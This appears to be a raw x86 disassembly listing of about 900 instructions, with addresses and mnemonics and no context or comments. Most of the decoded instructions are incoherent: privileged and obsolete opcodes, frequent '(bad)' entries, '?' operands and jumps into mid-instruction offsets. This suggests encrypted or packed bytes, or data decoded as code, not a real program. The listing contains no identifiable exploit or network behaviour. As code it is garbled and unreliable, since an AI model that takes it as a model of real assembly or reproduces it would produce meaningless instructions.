  414c0a:	dec    esp
  414c0b:	sbb    eax,0x57db4824
  414c10:	inc    ebx
  414c11:	sti    
  414c12:	fimul  WORD PTR [edx+0x1373046a]
  414c18:	fnstcw WORD PTR [esi]
  414c1a:	mov    al,ds:0xc52e997b
  414c1f:	mov    eax,0xf2fd5e77
  414c24:	iretw  
  414c26:	xor    DWORD PTR [esi-0x3813001f],edx
  414c2c:	sbb    dh,BYTE PTR [ebx+0x46e99b21]
  414c32:	stc    
  414c33:	mov    fs,ebx
  414c35:	push   0x70
  414c37:	dec    eax
  414c38:	push   esp
  414c39:	mov    cl,0xcb
  414c3b:	xchg   esi,eax
  414c3c:	dec    edx
  414c3d:	scas   al,BYTE PTR es:[edi]
  414c3e:	pop    ebx
  414c3f:	fcomp  DWORD PTR [ecx+0x48]
  414c42:	(bad)  [ebx]
  414c44:	cwde   
  414c45:	(bad)  
  414c46:	sti    
  414c47:	adc    BYTE PTR [ecx+0x7d3780a5],bl
  414c4d:	pop    ds
  414c4e:	jge    0x414c4e
  414c50:	stos   DWORD PTR es:[edi],eax
  414c51:	js     0x414c04
  414c53:	(bad)  
  414c54:	and    dl,dh
  414c56:	jge    0x414c1c
  414c58:	ss out dx,al
  414c5a:	shl    BYTE PTR [ecx+0x339a471e],1
  414c60:	jmp    0x414c23
  414c62:	retf   0x83e5
  414c65:	jge    0x414c96
  414c67:	push   ss
  414c68:	mov    ah,cl
  414c6a:	test   eax,ecx
  414c6c:	sahf   
  414c6d:	push   ss
  414c6e:	jnp    0x414c5f
  414c70:	and    bh,dl
  414c72:	and    dl,BYTE PTR [edi-0x6a76ed15]
  414c78:	(bad)  
  414c79:	jl     0x414c83
  414c7b:	mov    ds:0xa09fd13c,eax
  414c80:	xchg   BYTE PTR [edi],al
  414c82:	mov    dh,0x54
  414c84:	fdivp  st(3),st
  414c86:	jl     0x414c5c
  414c88:	and    esp,eax
  414c8a:	mov    ss,edx
  414c8c:	shr    cl,1
  414c8e:	sti    
  414c8f:	test   BYTE PTR [edx-0x7b],0xd0
  414c93:	pop    eax
  414c94:	sub    ecx,eax
  414c96:	cmc    
  414c97:	mov    gs,esp
  414c99:	fbstp  TBYTE PTR [esi-0x75]
  414c9c:	jle    0x414c47
  414c9e:	gs push ebx
  414ca0:	add    DWORD PTR [eax-0x63],edi
  414ca3:	out    0x7b,eax
  414ca5:	inc    eax
  414ca6:	(bad)  
  414ca7:	pop    ecx
  414ca8:	inc    edi
  414ca9:	or     eax,0x73c9a3b8
  414cae:	shr    esi,0x95
  414cb1:	inc    ebx
  414cb2:	loop   0x414c7b
  414cb4:	ret    0x815c
  414cb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cb8:	sahf   
  414cb9:	and    esp,DWORD PTR [ebx+esi*2-0x15]
  414cbd:	jl     0x414d21
  414cbf:	jmp    0x3e6d8630
  414cc4:	loopne 0x414ccd
  414cc6:	in     al,0x9c
  414cc8:	imul   edx,ebx,0xffffffbb
  414ccb:	jle    0x414d01
  414ccd:	dec    ebx
  414cce:	outs   dx,BYTE PTR ds:[esi]
  414ccf:	call   0x85abe8bf
  414cd4:	push   esp
  414cd5:	and    eax,0xde4a272a
  414cda:	stos   BYTE PTR es:[edi],al
  414cdb:	pop    eax
  414cdc:	inc    esp
  414cdd:	inc    edx
  414cde:	push   0xbcb8bd81
  414ce3:	lock (bad) 
  414ce5:	jnp    0x414c85
  414ce7:	push   ss
  414ce8:	mov    ecx,0xf99737dc
  414ced:	lahf   
  414cee:	jno    0x414c72
  414cf0:	or     ebp,DWORD PTR [ecx+0x18]
  414cf3:	mov    ecx,0x12134beb
  414cf8:	add    BYTE PTR [eax+0x23],dh
  414cfb:	fsub   QWORD PTR [esi-0x22]
  414cfe:	push   edi
  414cff:	push   esp
  414d00:	push   ds
  414d01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d02:	jl     0x414ca0
  414d04:	pop    es
  414d05:	inc    esi
  414d06:	sbb    BYTE PTR [eax],ah
  414d08:	pop    ebx
  414d09:	out    dx,eax
  414d0a:	cld    
  414d0b:	jl     0x414d39
  414d0d:	call   0x3cdb4d7f
  414d12:	mov    edi,0x226d41c8
  414d17:	sbb    esp,0xffffff81
  414d1a:	daa    
  414d1b:	ins    BYTE PTR es:[edi],dx
  414d1c:	jmp    0x414cd7
  414d1e:	daa    
  414d1f:	ret    
  414d20:	adc    dl,BYTE PTR [edx]
  414d22:	retf   0x99cb
  414d25:	fisttp WORD PTR [ebx]
  414d27:	mov    dl,0x3c
  414d29:	inc    ebp
  414d2a:	mov    bh,0x4b
  414d2c:	dec    esi
  414d2d:	idiv   ah
  414d2f:	mov    esi,0xa55b750e
  414d34:	(bad)  
  414d35:	jb     0x414d8a
  414d37:	mov    edi,0x62d528dd
  414d3c:	jmp    0x414d80
  414d3e:	cdq    
  414d3f:	mov    ebp,0x28813cad
  414d44:	loope  0x414d38
  414d46:	dec    ax
  414d48:	and    ebp,DWORD PTR [edx-0x6e]
  414d4b:	inc    esp
  414d4c:	cs aad 0xb6
  414d4f:	retf   
  414d50:	mov    ds:0xcb5430e9,eax
  414d55:	int3   
  414d56:	int3   
  414d57:	pusha  
  414d58:	xchg   esp,eax
  414d59:	pushf  
  414d5a:	xchg   edx,eax
  414d5b:	pop    es
  414d5c:	jmp    0x414d50
  414d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d5f:	leave  
  414d60:	scas   al,BYTE PTR es:[edi]
  414d61:	or     esp,eax
  414d63:	gs ins DWORD PTR es:[edi],dx
  414d65:	xchg   DWORD PTR [esi+ecx*8],ecx
  414d68:	ret    
  414d69:	inc    ebp
  414d6a:	ins    DWORD PTR es:[edi],dx
  414d6b:	and    BYTE PTR [ebx+0x3c],cl
  414d6e:	or     eax,0xe6735def
  414d73:	inc    ebp
  414d74:	sub    bl,BYTE PTR [edi-0x6]
  414d77:	aad    0xa8
  414d79:	pushf  
  414d7a:	mov    esp,0x76df3645
  414d7f:	in     al,dx
  414d80:	xchg   edi,eax
  414d81:	jmp    0x414d10
  414d83:	sub    dl,BYTE PTR [edx-0x6a]
  414d86:	push   DWORD PTR [ebx+eiz*1+0x89d1056]
  414d8d:	aas    
  414d8e:	and    BYTE PTR [eax],bh
  414d90:	into   
  414d91:	add    eax,0x186b70c0
  414d96:	jmp    FWORD PTR [edx+0x3c]
  414d99:	inc    eax
  414d9a:	mov    ebp,0xa2f9ebd4
  414d9f:	loop   0x414df8
  414da1:	jo     0x414d3a
  414da3:	inc    ecx
  414da4:	sbb    bl,bh
  414da6:	push   ds
  414da7:	add    al,0x13
  414da9:	lods   al,BYTE PTR ds:[esi]
  414daa:	mov    dh,0xf6
  414dac:	test   al,0x2d
  414dae:	sub    DWORD PTR [esi+ebx*8],ebp
  414db1:	mov    esi,0x3ab3486f
  414db6:	repz cmp DWORD PTR [eax+ecx*4],esi
  414dba:	aad    0xbe
  414dbc:	dec    esp
  414dbd:	dec    esp
  414dbe:	pop    ecx
  414dbf:	xchg   ebx,eax
  414dc0:	daa    
  414dc1:	push   0x7666437d
  414dc6:	jno    0x414dc4
  414dc8:	jmp    0x414e28
  414dca:	test   BYTE PTR [edi],0x1b
  414dcd:	loope  0x414db4
  414dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dd0:	js     0x414daa
  414dd2:	adc    DWORD PTR [ecx+ebx*4-0x66f2318],ebp
  414dd9:	(bad)  
  414dda:	cld    
  414ddb:	addr16 sahf 
  414ddd:	mov    al,ds:0xefedb090
  414de2:	loopne 0x414daf
  414de4:	mov    edx,0x1cac6cc0
  414de9:	enter  0x528,0x1b
  414ded:	popf   
  414dee:	xchg   esi,eax
  414def:	enter  0xc6ab,0xb4
  414df3:	mov    edi,0x839fec24
  414df8:	jmp    0x414da1
  414dfa:	jecxz  0x414e36
  414dfc:	cwde   
  414dfd:	push   esi
  414dfe:	aad    0xb9
  414e00:	adc    bl,bh
  414e02:	add    al,0x7d
  414e04:	int3   
  414e05:	retf   
  414e06:	and    eax,0xe58bf0ff
  414e0b:	js     0x414e40
  414e0d:	pop    edi
  414e0e:	mov    BYTE PTR [ecx-0x2d9a6369],dl
  414e14:	(bad)  
  414e16:	fld    st(2)
  414e18:	add    al,0xf3
  414e1a:	push   esi
  414e1b:	or     DWORD PTR [ecx],ecx
  414e1d:	pop    ds
  414e1e:	std    
  414e1f:	aas    
  414e20:	pop    es
  414e21:	sub    eax,0x64ebae8b
  414e26:	imul   edi,DWORD PTR [eax-0xc5abb01],0xffffff9c
  414e2d:	add    ebp,DWORD PTR [ebx+edi*8]
  414e30:	mov    esp,0x2d4a16eb
  414e35:	rcr    BYTE PTR [edi-0x1a5ef4e4],cl
  414e3b:	push   eax
  414e3c:	jmp    0x414dd6
  414e3e:	pushf  
  414e3f:	js     0x414e3a
  414e41:	fwait
  414e42:	sbb    esi,ebp
  414e44:	adc    bl,bh
  414e46:	je     0x414dfa
  414e48:	enter  0x8b58,0xe2
  414e4c:	inc    esp
  414e4d:	sti    
  414e4e:	cld    
  414e4f:	and    eax,0xcab828f8
  414e54:	ret    0x3944
  414e57:	jecxz  0x414ea7
  414e59:	pop    ebp
  414e5a:	jge    0x414e44
  414e5c:	sbb    eax,DWORD PTR [edi-0x5a125bc2]
  414e62:	rep stos DWORD PTR es:[edi],eax
  414e64:	lds    ebp,FWORD PTR [ebp-0x49]
  414e67:	push   0xcb55b944
  414e6c:	jecxz  0x414e4d
  414e6e:	mov    cl,0x9
  414e70:	xor    bl,dh
  414e72:	cwde   
  414e73:	imul   edx,DWORD PTR [ebx+0x1389274d],0x5bdd386d
  414e7d:	outs   dx,BYTE PTR fs:[esi]
  414e7f:	enter  0xcf1e,0xa9
  414e83:	xchg   ebx,eax
  414e84:	jb     0x414e8a
  414e86:	(bad)  
  414e87:	test   al,0xeb
  414e89:	push   es
  414e8a:	cmp    eax,0x35c7ee37
  414e8f:	arpl   WORD PTR [edi-0x3cf59321],cx
  414e95:	xchg   ebp,eax
  414e96:	inc    eax
  414e97:	mov    dl,0x30
  414e99:	test   ebp,edi
  414e9b:	or     BYTE PTR [edx-0x15],al
  414e9e:	scas   al,BYTE PTR es:[edi]
  414e9f:	mov    ah,0x48
  414ea1:	pop    esp
  414ea2:	push   edi
  414ea3:	mov    esp,0x4821dddf
  414ea8:	mov    esi,?
  414eaa:	mov    esi,0xfdd67098
  414eaf:	mov    eax,ds:0x7355fb0e
  414eb4:	popf   
  414eb5:	rcr    DWORD PTR [ebx+0x3dcad258],0xc8
  414ebc:	mov    ebp,DWORD PTR [esi+0x34]
  414ebf:	cli    
  414ec0:	xchg   esi,eax
  414ec1:	mov    ss,WORD PTR [ecx+esi*2-0x1a]
  414ec5:	nop    DWORD PTR [ebx]
  414ec8:	lds    ebp,FWORD PTR [ebp*1+0x7431d020]
  414ecf:	xor    BYTE PTR [ebp-0x21],bl
  414ed2:	xor    BYTE PTR [ebx],cl
  414ed4:	test   DWORD PTR [ebp-0x7dd703b6],ebx
  414eda:	std    
  414edb:	stos   BYTE PTR es:[edi],al
  414edc:	xchg   edx,eax
  414edd:	icebp  
  414ede:	dec    esi
  414edf:	mov    ?,WORD PTR [ebx]
  414ee1:	jb     0x414ecb
  414ee3:	mov    ch,0x6
  414ee5:	fwait
  414ee6:	mov    eax,cs
  414ee8:	xchg   sp,ax
  414eea:	(bad)  
  414eeb:	sub    eax,0xf9fe7c8d
  414ef0:	dec    BYTE PTR [esi+edx*4-0x5f1b3624]
  414ef7:	dec    ebx
  414ef8:	sub    edi,ebx
  414efa:	gs push 0xfffffff7
  414efd:	sub    al,0x69
  414eff:	les    esi,FWORD PTR [ebx+ebx*4+0x11eb6923]
  414f06:	cmp    al,0x64
  414f08:	mov    al,0x36
  414f0a:	in     eax,0xde
  414f0c:	sahf   
  414f0d:	fist   WORD PTR [ecx]
  414f0f:	dec    eax
  414f10:	push   ebp
  414f11:	jge    0x414ea3
  414f13:	adc    BYTE PTR [ebx],al
  414f15:	lahf   
  414f16:	cld    
  414f17:	adc    BYTE PTR [edi+0x7a],0x1e
  414f1b:	and    ebp,edx
  414f1d:	stos   DWORD PTR es:[edi],eax
  414f1e:	xchg   edi,eax
  414f1f:	enter  0x4b09,0xf
  414f23:	or     eax,0xbc2a0101
  414f28:	jmp    0x414eb9
  414f2a:	gs and dh,0x6c
  414f2e:	dec    edx
  414f2f:	in     al,dx
  414f30:	mov    WORD PTR [ecx],es
  414f32:	es stos BYTE PTR es:[edi],al
  414f34:	xchg   edi,ebx
  414f36:	test   al,0x42
  414f38:	jecxz  0x414ed3
  414f3a:	hlt    
  414f3b:	dec    edi
  414f3c:	jmp    0x414f3a
  414f3e:	ins    DWORD PTR es:[edi],dx
  414f3f:	out    dx,eax
  414f40:	fisub  WORD PTR [edx+0x3f]
  414f43:	call   0x21dc:0x7ba5d94c
  414f4a:	std    
  414f4b:	inc    ebp
  414f4c:	mov    di,0xf5de
  414f50:	jmp    0x414f92
  414f52:	adc    al,0x9c
  414f54:	mov    ecx,0x11ebb030
  414f59:	fistp  WORD PTR [ebp+0x10]
  414f5c:	mov    al,ds:0xd18811fa
  414f61:	dec    ebx
  414f62:	sub    al,BYTE PTR [edi-0x15]
  414f65:	dec    esi
  414f66:	fcom   DWORD PTR [edi]
  414f68:	pop    edi
  414f69:	dec    eax
  414f6a:	cmp    dl,ah
  414f6c:	aad    0xdf
  414f6e:	jg     0x414f97
  414f70:	arpl   WORD PTR ds:0xa820855,sp
  414f76:	std    
  414f77:	mov    al,0xd9
  414f79:	(bad)  
  414f7b:	fcmovne st,st(5)
  414f7d:	lods   al,BYTE PTR ds:[esi]
  414f7e:	add    eax,0x933e32c8
  414f83:	mov    esi,0x50d549e8
  414f88:	jmp    0x414f62
  414f8a:	or     DWORD PTR [edx+0x5b4c5906],ecx
  414f90:	(bad)  
  414f91:	fisttp WORD PTR [ebx+0x6e10525]
  414f97:	ror    bl,1
  414f99:	mov    dl,0xfc
  414f9b:	dec    esi
  414f9c:	fwait
  414f9d:	and    DWORD PTR [ecx],ebx
  414f9f:	stos   BYTE PTR es:[edi],al
  414fa0:	aam    0xad
  414fa2:	mov    al,ds:0x6e988fee
  414fa7:	enter  0x9776,0xa5
  414fab:	pop    es
  414fac:	in     eax,dx
  414fad:	and    bh,ch
  414faf:	xchg   ebx,esp
  414fb1:	inc    ebx
  414fb2:	jl     0x415003
  414fb4:	cmc    
  414fb5:	push   ss
  414fb6:	jno    0x414f77
  414fb8:	mov    al,0xae
  414fba:	mov    ds:0x637ac748,al
  414fbf:	mov    bh,0x9e
  414fc1:	outs   dx,DWORD PTR ds:[esi]
  414fc2:	std    
  414fc3:	dec    eax
  414fc4:	not    esp
  414fc6:	loop   0x414fa7
  414fc8:	ror    DWORD PTR [edx],0xff
  414fcb:	xchg   esp,eax
  414fcc:	mov    ecx,ebx
  414fce:	aad    0x20
  414fd0:	sbb    BYTE PTR [esi],bl
  414fd2:	sahf   
  414fd3:	test   DWORD PTR [edx+0x4dfc6c47],edx
  414fd9:	sahf   
  414fda:	(bad)  
  414fdb:	in     al,0xcc
  414fdd:	add    eax,DWORD PTR [ebx]
  414fdf:	ror    BYTE PTR [edx+0x6bf9179f],1
  414fe5:	fbld   TBYTE PTR [ebx-0x40525ffd]
  414feb:	adc    esi,DWORD PTR [eax+0x7]
  414fee:	std    
  414fef:	inc    DWORD PTR [edx+0x7b02b494]
  414ff5:	dec    edi
  414ff6:	ficom  DWORD PTR [ebx+ebp*4+0x75]
  414ffa:	adc    eax,0x794cebed
  414fff:	ins    BYTE PTR es:[edi],dx
  415000:	push   0xa36ef0cc
  415005:	fistp  WORD PTR [eax]
  415007:	adc    DWORD PTR [ebp+ecx*8-0x5],edi
  41500b:	daa    
  41500c:	mov    ds:0xdf7fc4d,al
  415011:	xor    ebx,edx
  415013:	push   edi
  415014:	dec    ebx
  415015:	lea    edi,[ebx]
  415017:	jmp    0x414fa2
  415019:	fild   QWORD PTR [ebx+0x304ab9e4]
  41501f:	or     DWORD PTR [ebp+0x3e8bfd87],ebx
  415025:	call   0x80a6:0x98ce061d
  41502c:	inc    BYTE PTR [ebx+0x33e7cbfd]
  415032:	cmp    DWORD PTR [ecx],esi
  415034:	sub    eax,0x787e2859
  415039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41503a:	adc    ecx,eax
  41503c:	push   edi
  41503d:	ds push ebp
  41503f:	cli    
  415040:	mov    ds,esp
  415042:	xchg   edi,eax
  415043:	inc    edi
  415044:	in     al,dx
  415045:	into   
  415046:	ror    BYTE PTR [ecx],0xb1
  415049:	dec    esp
  41504a:	adc    DWORD PTR [ebp-0x316c37d9],edx
  415050:	es scas al,BYTE PTR es:[edi]
  415052:	enter  0xcbb3,0xe2
  415056:	icebp  
  415057:	(bad)  ds:0x714ffb22
  41505d:	in     al,0xb1
  41505f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415060:	dec    edi
  415062:	mov    dh,0xc8
  415064:	jg     0x414fef
  415066:	in     al,dx
  415067:	jge    0x415071
  415069:	mov    bh,0x63
  41506b:	xchg   ecx,eax
  41506c:	popf   
  41506d:	xor    BYTE PTR [edx],ah
  41506f:	imul   ebp,ebx,0x5a
  415072:	mov    edx,0xf95ded0d
  415077:	sub    eax,0x9c72ea2a
  41507c:	test   al,0x1f
  41507e:	(bad)  
  41507f:	pop    ecx
  415080:	in     al,dx
  415081:	push   ss
  415082:	push   0x4972ea39
  415087:	lock or al,0xef
  41508a:	repnz push edi
  41508c:	icebp  
  41508d:	push   0x1cf0c8ca
  415092:	cli    
  415093:	xor    DWORD PTR [esi+0x4d],esi
  415096:	add    DWORD PTR [eax],ebx
  415098:	jmp    0x4150d7
  41509a:	mov    esp,0x67248141
  41509f:	and    dl,BYTE PTR [edx-0x21]
  4150a2:	push   ebp
  4150a3:	fyl2xp1 
  4150a5:	in     eax,0x4d
  4150a7:	loopne 0x41508d
  4150a9:	add    ch,bh
  4150ab:	pop    esp
  4150ac:	(bad)  
  4150ad:	iret   
  4150ae:	adc    BYTE PTR [eax-0x42904c82],dh
  4150b4:	push   ebx
  4150b5:	loopne 0x41506b
  4150b7:	enter  0x4e04,0xf1
  4150bb:	push   eax
  4150bc:	add    ebp,esi
  4150be:	bndstx [edi],(bad)
  4150c1:	hlt    
  4150c2:	(bad)  
  4150c3:	xchg   ecx,eax
  4150c4:	pop    ds
  4150c5:	mov    esi,0x40c87dd
  4150ca:	pop    ds
  4150cb:	int3   
  4150cc:	adc    BYTE PTR [ecx-0x67],0x22
  4150d0:	test   DWORD PTR [ebx],ebx
  4150d2:	std    
  4150d3:	cld    
  4150d4:	fsubp  st(2),st
  4150d6:	pop    esi
  4150d7:	jmp    0x415137
  4150d9:	jmp    FWORD PTR [ebx+0x28]
  4150dc:	hlt    
  4150dd:	rcl    DWORD PTR [ebp-0x3c],1
  4150e0:	js     0x4150c9
  4150e2:	pop    edx
  4150e3:	adc    al,0x10
  4150e5:	pop    edi
  4150e6:	popa   
  4150e7:	dec    ebp
  4150e8:	inc    edx
  4150e9:	jae    0x4150e9
  4150eb:	scas   eax,DWORD PTR es:[edi]
  4150ec:	outs   dx,DWORD PTR ds:[esi]
  4150ed:	push   esp
  4150ee:	or     eax,0x3ccee80e
  4150f3:	cmc    
  4150f4:	sub    dh,bh
  4150f6:	stos   BYTE PTR es:[edi],al
  4150f7:	and    al,0xea
  4150f9:	fwait
  4150fa:	sbb    bh,dl
  4150fc:	jmp    0x4150fb
  4150fe:	jns    0x415127
  415100:	fist   WORD PTR [esi+ecx*1]
  415103:	out    dx,eax
  415104:	int    0xb0
  415106:	dec    eax
  415107:	mov    ebx,ebp
  415109:	jg     0x415176
  41510b:	cmc    
  41510c:	jnp    0x415124
  41510e:	jl     0x4150a9
  415110:	fcomp  st(7)
  415112:	cmc    
  415113:	(bad)  
  415114:	stc    
  415115:	sub    bh,bl
  415117:	out    0x45,al
  415119:	in     al,0x1c
  41511b:	imul   DWORD PTR [ebx-0x4be9bf5f]
  415121:	fistp  QWORD PTR [esi+0x5]
  415124:	(bad)  
  415125:	mov    dh,0x36
  415127:	pop    esi
  415128:	icebp  
  415129:	add    ch,bh
  41512b:	xlat   BYTE PTR ds:[ebx]
  41512c:	ins    DWORD PTR es:[edi],dx
  41512d:	pop    ebx
  41512e:	out    dx,eax
  41512f:	mov    eax,ds:0xcb21e0bf
  415134:	fsub   DWORD PTR [ebx]
  415136:	cdq    
  415137:	pop    ecx
  415138:	push   eax
  415139:	jb     0x4150d3
  41513b:	jmp    0xd6802fa3
  415140:	jmp    0x415194
  415142:	leave  
  415143:	mov    ch,0xc7
  415145:	jecxz  0x4150d3
  415147:	(bad)  
  415148:	pandn  mm3,QWORD PTR [edi]
  41514b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41514c:	xor    dl,BYTE PTR [edi+ebp*2+0x62]
  415150:	int3   
  415151:	mov    al,ds:0xbaa582fc
  415156:	pop    esp
  415157:	out    dx,eax
  415158:	arpl   WORD PTR [ebx-0x2b],di
  41515b:	enter  0xb3fe,0x57
  41515f:	mov    esp,0xdf05d01e
  415164:	add    BYTE PTR [ebp-0x43],bl
  415167:	lea    edx,[ecx+ebp*2-0x78]
  41516b:	xchg   edx,eax
  41516c:	scas   al,BYTE PTR es:[edi]
  41516d:	inc    edi
  41516e:	inc    ebx
  41516f:	enter  0xe1e2,0x5e
  415173:	pop    ecx
  415174:	sti    
  415175:	sti    
  415176:	jbe    0x41519a
  415178:	jmp    0x4151d0
  41517a:	sub    BYTE PTR [ebp-0x41],0x37
  41517e:	je     0x41510e
  415180:	jb     0x4151b9
  415182:	ret    0x34c8
  415185:	dec    ecx
  415186:	ss dec esp
  415188:	js     0x415176
  41518a:	mov    edi,0x3033eb3c
  41518f:	push   cx
  415191:	outs   dx,DWORD PTR ds:[esi]
  415192:	mov    eax,ds:0x76dfbb55
  415197:	mov    WORD PTR [ecx],gs
  415199:	sub    cl,BYTE PTR [eax-0x97a795e]
  41519f:	jne    0x4151c9
  4151a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151a2:	aas    
  4151a3:	(bad)  
  4151a4:	jb     0x415194
  4151a6:	in     al,dx
  4151a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151a8:	aaa    
  4151a9:	sbb    al,0xa8
  4151ab:	enter  0xf27f,0xe9
  4151af:	jae    0x4151c2
  4151b1:	jmp    0x41522f
  4151b3:	xchg   esp,eax
  4151b4:	btc    esp,0x45
  4151b8:	test   eax,0xcf718bd6
  4151bd:	sbb    bh,ah
  4151bf:	(bad)  
  4151c0:	out    dx,al
  4151c1:	(bad)  
  4151c2:	(bad)  
  4151c3:	mul    DWORD PTR [ecx+0x63]
  4151c6:	repz and eax,0xcb9a58ea
  4151cc:	mov    dh,0x36
  4151ce:	cwde   
  4151cf:	or     dl,ah
  4151d1:	outs   dx,DWORD PTR ds:[esi]
  4151d2:	adc    al,0x9f
  4151d4:	call   0xde6a:0xe88103d8
  4151db:	mov    ch,0xb
  4151dd:	(bad)  
  4151de:	fldcw  WORD PTR [edi]
  4151e0:	cmp    BYTE PTR [esp+edi*8+0x37d98963],bh
  4151e7:	mov    ah,0x5b
  4151e9:	outs   dx,DWORD PTR ds:[esi]
  4151ea:	mov    ebx,0x8adef9c8
  4151ef:	shl    ebp,0xe3
  4151f2:	mov    eax,ds:0x8870eb42
  4151f7:	pop    es
  4151f8:	(bad)  
  4151f9:	push   ebx
  4151fa:	xlat   BYTE PTR ds:[ebx]
  4151fb:	iret   
  4151fc:	aad    0xc5
  4151fe:	popa   
  4151ff:	enter  0x5101,0x2f
  415203:	adc    BYTE PTR [ecx],bl
  415205:	pop    edx
  415206:	and    eax,0xba1febe5
  41520b:	sub    eax,0x750d6f1b
  415210:	xchg   ebp,eax
  415211:	add    ebp,eax
  415213:	iret   
  415214:	(bad)  
  415215:	fbstp  TBYTE PTR [edx+0x20]
  415218:	adc    DWORD PTR [esi+ecx*4],ebx
  41521b:	int    0x13
  41521d:	into   
  41521e:	cld    
  41521f:	loopne 0x41524d
  415221:	pusha  
  415222:	jb     0x41527a
  415224:	mov    esi,0x56cbc897
  415229:	mov    ch,0x87
  41522b:	fwait
  41522c:	xor    al,0xea
  41522e:	test   ah,ch
  415230:	fadd   st,st(0)
  415232:	cld    
  415233:	daa    
  415234:	or     DWORD PTR [ecx-0x34ae745f],0xfffffff4
  41523b:	(bad)  
  41523c:	jle    0x415223
  41523e:	fwait
  41523f:	pop    ss
  415240:	sub    al,0x23
  415242:	(bad)  
  415243:	xchg   esi,eax
  415244:	iret   
  415245:	sbb    eax,0xf1eb6f96
  41524a:	push   0x42a2221e
  41524f:	enter  0x1103,0xcb
  415253:	and    BYTE PTR [edx],dl
  415255:	jns    0x41526d
  415257:	add    ebp,edi
  415259:	add    DWORD PTR [eax+0x1bbceb60],edx
  41525f:	mov    dl,BYTE PTR ds:0xdcc7ef37
  415265:	mov    DWORD PTR [esi-0xfd20035],ecx
  41526b:	ds stc 
  41526d:	add    BYTE PTR ds:0xb87beb56,ch
  415273:	cmc    
  415274:	add    al,0x9a
  415276:	pusha  
  415277:	enter  0x529a,0xa0
  41527b:	loop   0x41526d
  41527d:	clc    
  41527e:	mov    dl,0xdf
  415280:	jmp    0x415282
  415282:	jmp    0x81ab9af2
  415287:	dec    ecx
  415288:	cmp    BYTE PTR [eax],cl
  41528a:	pop    ebx
  41528b:	imul   ebp,DWORD PTR [ebx+eax*1+0x2e],0xffffffcd
  415290:	popf   
  415291:	clc    
  415292:	imul   esp,edx,0x5024fee6
  415298:	imul   edx,DWORD PTR [eax+0x30],0xffffff89
  41529c:	sub    ebx,edi
  41529e:	jne    0x4152bd
  4152a0:	pop    esi
  4152a1:	and    BYTE PTR [edi-0x2f],bl
  4152a4:	jb     0x415301
  4152a6:	std    
  4152a7:	test   DWORD PTR [ebx],0xbc1a85bc
  4152ad:	loop   0x4152df
  4152af:	fbld   TBYTE PTR [edx]
  4152b1:	lds    ecx,FWORD PTR [edi-0x6320b110]
  4152b7:	(bad)  
  4152b9:	sbb    bh,BYTE PTR [edi+0x5c]
  4152bc:	loopne 0x415273
  4152be:	push   0x92036b4f
  4152c3:	enter  0xe946,0x7f
  4152c7:	cmc    
  4152c8:	xor    bh,bl
  4152ca:	shl    BYTE PTR ds:0x35346114,cl
  4152d0:	popf   
  4152d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152d2:	fsub   DWORD PTR [edx+0x54ffa315]
  4152d8:	jnp    0x415267
  4152da:	push   edi
  4152db:	sbb    BYTE PTR [eax],cl
  4152dd:	aad    0x4b
  4152df:	enter  0xcd95,0x62
  4152e3:	sbb    eax,0x804df00b
  4152e8:	jmp    0x76f3c330
  4152ed:	pushf  
  4152ee:	mov    bl,0xa8
  4152f0:	and    ebx,DWORD PTR [ecx-0x25]
  4152f3:	retf   0xd75d
  4152f6:	xchg   BYTE PTR [edx],bh
  4152f8:	jb     0x415377
  4152fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152fb:	pop    esp
  4152fc:	xor    eax,0xcfa4fd7c
  415301:	out    0x50,al
  415303:	mov    dl,BYTE PTR [ebp-0x53]
  415306:	sub    edx,edx
  415308:	comiss xmm0,DWORD PTR [eax]
  41530b:	xor    al,0x4b
  41530d:	fldcw  WORD PTR [ecx]
  41530f:	add    eax,0x2ab633ab
  415314:	sub    al,0xc
  415316:	test   eax,0x4c5aec53
  41531b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41531c:	gs nop
  41531e:	mov    ch,0xef
  415320:	adc    BYTE PTR [edx-0x3b],cl
  415323:	xchg   esi,eax
  415324:	hlt    
  415325:	fbld   TBYTE PTR [edx]
  415327:	xchg   DWORD PTR [ebx-0x6bcbcef5],edi
  41532d:	or     ch,bh
  41532f:	popa   
  415330:	repnz inc esp
  415332:	ror    BYTE PTR [ebx-0x35],cl
  415335:	adc    eax,0xfdb5c8be
  41533a:	and    al,ah
  41533c:	jns    0x415337
  41533e:	enter  0xebbf,0x3d
  415342:	sahf   
  415343:	mov    al,ah
  415345:	inc    edi
  415346:	sub    DWORD PTR [ebx],esp
  415348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415349:	fistp  QWORD PTR [ecx]
  41534b:	lea    ecx,[esi+0x74fa1096]
  415351:	and    ch,bh
  415353:	repz fld TBYTE PTR [ebp+0x7bc19ae0]
  41535a:	or     ecx,ecx
  41535c:	aam    0x11
  41535e:	and    al,0xab
  415360:	xchg   DWORD PTR [esi],esp
  415362:	sub    BYTE PTR [esi+eax*4],al
  415365:	pusha  
  415366:	std    
  415367:	mov    dh,0x1f
  415369:	pop    ebp
  41536a:	jp     0x415314
  41536c:	or     BYTE PTR [ecx-0x6e],ch
  41536f:	enter  0x15df,0x29
  415373:	std    
  415374:	pop    ss
  415375:	xor    al,BYTE PTR [eax-0x2c2e059]
  41537b:	test   esi,ebp
  41537d:	fwait
  41537e:	and    al,0xd6
  415380:	aam    0x3b
  415382:	cmc    
  415383:	mov    esp,0x2ffb5768
  415389:	or     BYTE PTR [eax+eax*1-0x15],al
  41538d:	inc    esp
  41538e:	int3   
  41538f:	add    DWORD PTR [esi-0x30e0eb4f],ebp
  415395:	fbld   TBYTE PTR [ecx-0x1a120c90]
  41539b:	mov    ebx,0xbfd342d
  4153a0:	sbb    edi,ebp
  4153a2:	push   ds
  4153a3:	xchg   edi,eax
  4153a4:	(bad)  
  4153a5:	rcr    edx,0xc7
  4153a8:	into   
  4153a9:	or     DWORD PTR ss:[edx+eax*1],eax
